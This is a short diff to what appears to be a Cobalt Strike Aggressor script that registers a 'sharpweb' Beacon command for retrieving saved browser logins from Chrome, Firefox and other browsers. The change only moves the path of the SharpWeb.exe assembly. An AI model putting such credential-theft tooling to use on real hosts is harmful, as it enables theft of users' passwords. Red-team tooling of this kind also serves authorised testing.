@@ -4,7 +4,7 @@ beacon_command_register("sharpweb", "Retrieve saved logins from Google Chrome, F
 alias sharpweb{
 	local('$bid $asm $desc @args $argu');
 	$bid = $1;
-	$asm = "/opt/exe/SharpWeb.exe";
+	$asm = "/opt/cobalt_strike_extension_kit/exe/SharpWeb.exe";
 	$desc = "SharpWeb";
 	@args = @_;
 	remove(@args, $bid);
